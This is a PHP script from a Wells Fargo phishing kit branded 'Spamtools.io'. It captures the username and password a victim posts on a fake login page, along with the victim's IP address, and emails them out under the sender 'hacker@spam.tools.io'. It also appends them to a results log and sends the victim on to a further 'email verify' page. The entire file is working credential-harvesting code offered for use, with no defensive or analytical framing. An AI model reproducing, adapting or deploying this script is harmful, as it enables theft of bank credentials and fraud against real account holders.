<?php
error_reporting(0);
session_start();
include ('bt.php');
include 'email.php';
include 'config.php';

$user = $_POST['username'];
$pass = $_POST['password'];
if(empty($user) && empty($pass)){
	header("Location: verify.php");
	die("Error Login");
}

$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");
$message .= "------[Wellsfargo - Spamtools.io]-----\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "Account Summary".$_POST['destination'];
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Login-------------\n";
$from = "hacker@spam.tools.io";
    $subject = " Wellsfargo Login: ".$ip."\n"; 
    mail($send, $subject, $message, $from);m();


$milaf = fopen("../results/login.txt","a");   
fwrite($milaf,$message);	

redirect('emailverify.php');
		   


?>